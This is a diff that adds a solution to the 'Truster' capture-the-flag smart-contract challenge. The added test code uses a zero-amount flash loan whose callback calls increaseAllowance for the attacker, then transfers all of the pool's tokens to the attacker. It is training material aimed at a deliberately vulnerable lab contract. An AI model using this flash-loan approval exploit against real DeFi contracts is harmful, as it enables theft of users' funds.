@@ -29,6 +29,25 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        // solution #1
+        const functionSignature = "increaseAllowance(address, uint256)"
+        const functionArgs = [ attacker.address, TOKENS_IN_POOL ]
+        const bytesCalldata = this.token.interface.encodeFunctionData(
+            functionSignature,
+            functionArgs,
+        )
+        await this.pool.flashLoan(
+            0,
+            attacker.address,
+            this.token.address,
+            bytesCalldata,
+        )
+        await this.token.connect(attacker).transferFrom(
+            this.pool.address,
+            attacker.address,
+            TOKENS_IN_POOL,
+        )
     });
 
     after(async function () {
